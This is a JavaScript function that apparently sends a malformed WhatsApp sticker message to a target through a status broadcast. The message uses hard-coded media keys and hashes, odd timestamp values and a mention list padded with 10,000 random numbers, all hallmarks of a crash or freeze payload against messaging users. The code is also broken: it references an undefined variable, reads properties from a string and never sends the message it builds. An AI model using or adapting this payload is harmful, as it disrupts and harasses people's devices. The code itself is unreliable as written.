async function XvBul(target) {
  const mediaData = [{
    ID: "69680D38",
    uri: "t62.43144-24/10000000_790307790709311_669779370012050552_n.enc?ccb=11-4&oh",
    buffer: "11-4&oh=01_Q5Aa3QGnIg1qMpL5Isc7LmIdU1IpoFsCqXialsd2OW2w0QQyUw&oe",
    sid: "5e03e0",
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
    ENCSHA256: "7ovcifxdIivWXIJgLvrRtPfs+pPXen7hoXtnoFKdP4s=",
    mkey: "Wql96TBHCa44YVS6eAlHGI6aYIYg6yc0kuOr0Y9WvtI="
  },
    {
      ID: "69680D38",
      uri: "t62.43144-24/10000000_1534257120961824_1506742782412655205_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa3QEE7wUPnOULMZhlwnOw_bhHK6Gn7YI0hKpVm3yvw5dGMw&oe",
      sid: "5e03e0",
      SHA256: "I2ky6mhJmsFYmA+XRBoiaiTeYwnXGQAVXym+P/9YN6Y=",
      ENCSHA256: "HyfU2MhgxBQFFIohXT68RNZa0MAZRxDYB4X1c3I7JQY=",
      mkey: "Q5V7iUFs67ewh1qOOkqwQ9avc3u7qXAhyh2fIgVITCU="
    },
    {
      ID: "696C0CE0",
      uri: "t62.43144-24/10000000_1897784937438799_7647459696855315586_n.enc?ccb=11-4&oh",
      buffer: "01_Q5Aa3QGNjK1V4UGLF19HxU16vRNPFJQjy64pYSFbsuEm6bySdw&oe",
      sid: "5e03e0",
      SHA256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
      ENCSHA256: "RA4VN83TrKamnTjEolURSU7+2UUDY28EFBBQvFNh7e4=",
      mkey: "dTMN5/4/mFir4PcfgezcrIXqigJ8pl/COUQMxUsTaac="
    }];
  let sequentialIndex = 0;
  var a = mediaData[sequentialIndex];
  sequentialIndex = (sequentialIndex + 1) % mediaData.length;
  var b = a.ID;
  const e = a.uri,
  f = a.buffer,
  g = a.sid,
  k = a.SHA256,
  l = a.ENCSHA256;
  a = a.mkey;
  let c;
  c = !1;

  const msg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${e}=${f}=${b}&_nc_sid=${g}&mms3=true`,
          fileSha256: k,
          fileEncSha256: l,
          mediaKey: a,
          mimetype: "image/webp",
          directPath: `/v/${e}=${f}=${b}&_nc_sid=${g}`,
          fileLength: {
            low: Math.floor(1E3 * Math.random()),
            high: 0,
            unsigned: !0
          },
          mediaKeyTimestamp: {
            low: Math.floor(17E8 *
              Math.random()),
            high: 0,
            unsigned: !1
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: !0,
          contextInfo: {
            participant: d,
            mentionedJid: ["0@s.whatsapp.net",
              ...Array.from({
                length: 1E4
              }, () => "1" + Math.floor(5E6 * Math.random()) + "@s.whatsapp.net")],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593
          },
          stickerSentTs: {
            low: Math.floor(-2E7 * Math.random()),
            high: 555,
            unsigned: c
          },
          isAvatar: true,
          isAiSticker: true,
          isLottie: true
        }
      }
    }
  }

  await client.relayMessage("status@broadcast", b.message, {
    messageId: b.key.id,
    statusJidList: [d],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: {
            jid: d
          },
          content: void 0
        }]
      }]
    }]
  })

}
